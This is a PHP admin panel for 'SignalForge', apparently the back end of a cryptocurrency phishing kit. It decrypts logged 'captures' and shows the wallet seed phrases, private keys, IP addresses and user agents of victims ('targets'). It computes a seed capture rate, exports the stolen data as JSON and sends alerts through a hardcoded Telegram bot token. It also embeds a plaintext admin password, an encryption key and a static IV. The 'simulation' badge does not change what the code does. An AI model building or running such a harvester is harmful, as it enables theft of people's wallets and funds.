<?php
/**
 * admin.php — SignalForge Admin Panel
 */

session_start();

$ADMIN_PASSWORD     = 'SignalForge@Admin2026';
$ENCRYPTION_KEY     = 'SignalForge_Render_2026_Secret!!';
$ENCRYPTION_IV      = '1234567890abcdef';
$TELEGRAM_BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
$TELEGRAM_CHAT_ID   = getenv('TELEGRAM_CHAT_ID')   ?: '6964954278';

// Handle login
$isAuthed = false;
$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === $ADMIN_PASSWORD) {
        $_SESSION['sf_admin'] = true;
        $isAuthed = true;
    } else {
        $error = 'Invalid password';
    }
}
if (isset($_SESSION['sf_admin']) && $_SESSION['sf_admin'] === true) $isAuthed = true;
if (isset($_GET['logout'])) { session_destroy(); header('Location: admin.php'); exit; }

// Handle actions
$message = '';
if ($isAuthed) {
    $logFile    = __DIR__ . '/logs/captures.log';
    $summaryFile = __DIR__ . '/logs/summary.log';

    if (isset($_GET['action']) && $_GET['action'] === 'clear_all') {
        file_put_contents($logFile, '');
        file_put_contents($summaryFile, '');
        $message = 'success_clear';
    }

    if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['line'])) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $ln = intval($_GET['line']);
        if (isset($lines[$ln])) {
            unset($lines[$ln]);
            file_put_contents($logFile, implode("\n", array_values($lines)) . "\n");
            $message = 'success_delete';
        }
    }

    if (isset($_GET['action']) && $_GET['action'] === 'export') {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $data = [];
        foreach ($lines as $line) {
            $d = openssl_decrypt(base64_decode($line), 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
            if ($d) $data[] = json_decode($d, true);
        }
        header('Content-Type: application/json');
        header('Content-Disposition: attachment; filename="signalforge_captures_' . date('Y-m-d') . '.json"');
        echo json_encode($data, JSON_PRETTY_PRINT);
        exit;
    }

    // Test Telegram
    if (isset($_GET['action']) && $_GET['action'] === 'test_telegram') {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode([
                'chat_id' => $TELEGRAM_CHAT_ID,
                'text' => '✅ SignalForge Telegram alerts are LIVE!',
                'parse_mode' => 'Markdown'
            ]),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
        ]);
        $resp = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        $message = $http === 200 ? 'success_tg' : 'fail_tg';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SignalForge — Admin Panel</title>
    <link rel="icon" type="image/png" href="images/logo.png">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; background:#0a0a1a; color:#e0e0e0; min-height:100vh; }
        .container { max-width:1400px; margin:0 auto; padding:24px; }

        .header { display:flex; justify-content:space-between; align-items:center; padding:20px 0; border-bottom:1px solid rgba(99,102,241,0.1); margin-bottom:30px; flex-wrap:wrap; gap:16px; }
        .header .brand { display:flex; align-items:center; gap:10px; }
        .header .brand img { height:28px; width:28px; border-radius:6px; }
        .header .brand span { font-size:18px; font-weight:700; background:linear-gradient(135deg,#818cf8,#a78bfa); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .header .badge { padding:6px 14px; background:rgba(255,107,107,0.1); border:1px solid rgba(255,107,107,0.2); border-radius:50px; font-size:11px; color:#ff6b6b; font-weight:600; }
        .header-actions { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
        .header-actions a { padding:8px 16px; border-radius:8px; font-size:13px; font-weight:500; text-decoration:none; transition:all 0.2s; }
        .btn-danger { background:rgba(255,107,107,0.1); color:#ff6b6b; border:1px solid rgba(255,107,107,0.2); }
        .btn-danger:hover { background:rgba(255,107,107,0.2); }
        .btn-outline { background:transparent; color:#888; border:1px solid rgba(255,255,255,0.1); }
        .btn-outline:hover { border-color:#6366f1; color:#fff; }
        .btn-success { background:rgba(76,175,80,0.1); color:#4caf50; border:1px solid rgba(76,175,80,0.2); }
        .btn-success:hover { background:rgba(76,175,80,0.2); }
        .btn-logout { background:transparent; color:#666; border:1px solid rgba(255,255,255,0.05); }
        .btn-logout:hover { color:#ff6b6b; border-color:rgba(255,107,107,0.3); }

        .login-box { background:#111125; padding:48px; border-radius:16px; max-width:420px; margin:80px auto; text-align:center; border:1px solid rgba(99,102,241,0.1); }
        .login-box .lock { font-size:48px; margin-bottom:16px; }
        .login-box h2 { font-size:22px; margin-bottom:8px; color:#fff; }
        .login-box p { color:#666; font-size:14px; margin-bottom:24px; }
        .login-box input { width:100%; padding:14px 18px; background:#0a0a1a; border:1px solid rgba(255,255,255,0.08); border-radius:10px; color:white; font-size:16px; margin-bottom:16px; }
        .login-box input:focus { outline:none; border-color:#6366f1; }
        .login-box button { width:100%; padding:14px; background:linear-gradient(135deg,#6366f1,#8b5cf6); border:none; border-radius:10px; color:white; font-size:16px; font-weight:600; cursor:pointer; }
        .login-box button:hover { box-shadow:0 8px 25px rgba(99,102,241,0.3); }
        .login-error { color:#ff6b6b; font-size:13px; margin-top:12px; }

        .stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:16px; margin-bottom:24px; }
        .stat-card { background:#111125; border:1px solid rgba(255,255,255,0.05); border-radius:12px; padding:20px; text-align:center; }
        .stat-card .num { font-size:28px; font-weight:700; color:#fff; }
        .stat-card .num.green { color:#4caf50; }
        .stat-card .num.red { color:#ff6b6b; }
        .stat-card .num.purple { color:#a78bfa; }
        .stat-card .lbl { font-size:12px; color:#666; margin-top:4px; text-transform:uppercase; letter-spacing:0.5px; }

        .msg { padding:12px 20px; border-radius:8px; margin-bottom:20px; font-size:14px; }
        .msg.success { background:rgba(76,175,80,0.1); border:1px solid rgba(76,175,80,0.2); color:#4caf50; }
        .msg.error { background:rgba(255,107,107,0.1); border:1px solid rgba(255,107,107,0.2); color:#ff6b6b; }
        .msg.info { background:rgba(99,102,241,0.08); border:1px solid rgba(99,102,241,0.15); color:#818cf8; }

        .table-wrap { background:#111125; border:1px solid rgba(255,255,255,0.05); border-radius:12px; overflow-x:auto; }
        table { width:100%; border-collapse:collapse; }
        th { background:rgba(255,255,255,0.03); padding:14px 16px; text-align:left; font-size:11px; color:#666; text-transform:uppercase; letter-spacing:0.5px; font-weight:600; border-bottom:1px solid rgba(255,255,255,0.05); white-space:nowrap; }
        td { padding:14px 16px; border-bottom:1px solid rgba(255,255,255,0.03); font-size:13px; vertical-align:top; }
        tr:hover td { background:rgba(99,102,241,0.03); }
        .cell-id { font-family:monospace; font-size:11px; color:#555; }
        .cell-ip { font-family:monospace; font-size:12px; color:#888; }
        .cell-seed { font-family:monospace; font-size:12px; color:#4caf50; word-break:break-all; max-width:280px; }
        .cell-key { font-family:monospace; font-size:12px; color:#ff6b6b; word-break:break-all; max-width:200px; }
        .cell-none { color:#444; font-style:italic; }
        .cell-time { font-size:12px; color:#666; white-space:nowrap; }
        .cell-ua { font-size:11px; color:#555; max-width:150px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        .cell-action a { color:#ff6b6b; text-decoration:none; font-size:12px; padding:4px 10px; border-radius:4px; }
        .cell-action a:hover { background:rgba(255,107,107,0.1); }
        .no-data { text-align:center; padding:60px 20px; color:#555; font-size:15px; }
        .no-data .big-icon { font-size:48px; margin-bottom:16px; opacity:0.5; }

        .summary-box { margin-top:24px; background:#111125; border:1px solid rgba(255,255,255,0.05); border-radius:12px; padding:20px; }
        .summary-box h3 { font-size:13px; color:#666; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:12px; }
        .summary-box pre { background:#0a0a1a; padding:16px; border-radius:8px; font-size:12px; color:#555; max-height:200px; overflow-y:auto; white-space:pre-wrap; font-family:'SF Mono',monospace; line-height:1.6; }

        @media (max-width:768px) {
            .container { padding:16px; }
            .header { flex-direction:column; align-items:flex-start; }
            .header-actions { width:100%; flex-wrap:wrap; }
            td,th { padding:10px 12px; font-size:12px; }
            .cell-seed { max-width:120px; }
            .cell-key { max-width:80px; }
        }
    </style>
</head>
<body>
<div class="container">
    <?php if (!$isAuthed): ?>
        <div class="login-box">
            <div class="lock">🔒</div>
            <h2>SignalForge Admin</h2>
            <p>Enter admin password to access the control panel</p>
            <form method="POST">
                <input type="password" name="password" placeholder="Admin password" required autofocus>
                <button type="submit">Access Panel</button>
            </form>
            <?php if ($error): ?><div class="login-error">❌ <?php echo $error; ?></div><?php endif; ?>
        </div>
    <?php else: ?>
        <div class="header">
            <div style="display:flex;align-items:center;gap:16px;">
                <div class="brand"><img src="images/logo.png" alt="SF"><span>SignalForge</span></div>
                <div class="badge">🔴 PHISHING SIMULATION</div>
            </div>
            <div class="header-actions">
                <a href="?action=test_telegram" class="btn-success">📨 Test Telegram</a>
                <a href="?action=export" class="btn-outline">📥 Export JSON</a>
                <a href="?action=clear_all" class="btn-danger" onclick="return confirm('⚠️ Delete ALL captures? This cannot be undone.')">🗑️ Clear All</a>
                <a href="?logout=1" class="btn-logout">🚪 Logout</a>
            </div>
        </div>

        <?php
        if ($message === 'success_clear') echo '<div class="msg success">✅ All captures deleted.</div>';
        if ($message === 'success_delete') echo '<div class="msg success">✅ Entry deleted.</div>';
        if ($message === 'success_tg') echo '<div class="msg success">✅ Telegram test sent! Check your Telegram.</div>';
        if ($message === 'fail_tg') echo '<div class="msg error">❌ Telegram test failed. Check token/chat ID.</div>';

        $logFile = __DIR__ . '/logs/captures.log';
        $summaryFile = __DIR__ . '/logs/summary.log';
        $captures = []; $totalSeeds = 0; $totalKeys = 0; $ips = [];

        if (file_exists($logFile)) {
            $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($lines as $line) {
                $d = openssl_decrypt(base64_decode($line), 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
                if ($d) {
                    $data = json_decode($d, true);
                    if ($data) {
                        $captures[] = $data;
                        if (!empty($data['seed'])) $totalSeeds++;
                        if (!empty($data['pkey'])) $totalKeys++;
                        if (!empty($data['ip'])) $ips[] = $data['ip'];
                    }
                }
            }
        }
        $total = count($captures);
        $uniqueIps = array_unique($ips);
        ?>

        <div class="stats-grid">
            <div class="stat-card"><div class="num purple"><?php echo $total; ?></div><div class="lbl">Total Captures</div></div>
            <div class="stat-card"><div class="num green"><?php echo $totalSeeds; ?></div><div class="lbl">Seed Phrases</div></div>
            <div class="stat-card"><div class="num red"><?php echo $totalKeys; ?></div><div class="lbl">Private Keys</div></div>
            <div class="stat-card"><div class="num purple"><?php echo count($uniqueIps); ?></div><div class="lbl">Unique IPs</div></div>
            <div class="stat-card"><div class="num"><?php echo $total > 0 ? round(($totalSeeds/$total)*100).'%' : '0%'; ?></div><div class="lbl">Seed Capture Rate</div></div>
        </div>

        <div class="table-wrap">
            <?php if (empty($captures)): ?>
                <div class="no-data"><div class="big-icon">📭</div><p>No captures yet.<br>Send targets to <strong>dashboard.html</strong></p></div>
            <?php else: ?>
                <table>
                    <thead><tr><th>#</th><th>ID</th><th>Timestamp</th><th>IP</th><th>Seed Phrase</th><th>Private Key</th><th>Words</th><th>Screen</th><th>User Agent</th><th>Action</th></tr></thead>
                    <tbody>
                    <?php foreach (array_reverse($captures) as $idx => $c):
                        $realIdx = count($captures) - 1 - $idx; ?>
                        <tr>
                            <td><?php echo $idx + 1; ?></td>
                            <td class="cell-id"><?php echo htmlspecialchars(substr($c['id']??'', 0, 12)); ?></td>
                            <td class="cell-time"><?php echo htmlspecialchars($c['capturedAt']??'N/A'); ?></td>
                            <td class="cell-ip"><?php echo htmlspecialchars($c['ip']??'N/A'); ?></td>
                            <td class="<?php echo !empty($c['seed'])?'cell-seed':'cell-none'; ?>"><?php echo !empty($c['seed'])?htmlspecialchars($c['seed']):'— None —'; ?></td>
                            <td class="<?php echo !empty($c['pkey'])?'cell-key':'cell-none'; ?>"><?php echo !empty($c['pkey'])?htmlspecialchars($c['pkey']):'— None —'; ?></td>
                            <td><?php echo $c['seedWordCount']??0; ?></td>
                            <td class="cell-ua"><?php echo htmlspecialchars($c['screenSize']??'N/A'); ?></td>
                            <td class="cell-ua" title="<?php echo htmlspecialchars($c['userAgent']??''); ?>"><?php echo htmlspecialchars(substr($c['userAgent']??'',0,40)); ?>...</td>
                            <td class="cell-action"><a href="?action=delete&line=<?php echo $realIdx; ?>" onclick="return confirm('Delete this entry?')">Delete</a></td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </div>

        <?php if (file_exists($summaryFile) && filesize($summaryFile) > 0): ?>
            <div class="summary-box"><h3>📋 Activity Log</h3><pre><?php echo htmlspecialchars(file_get_contents($summaryFile)); ?></pre></div>
        <?php endif; ?>
    <?php endif; ?>
</div>
</body>
</html>
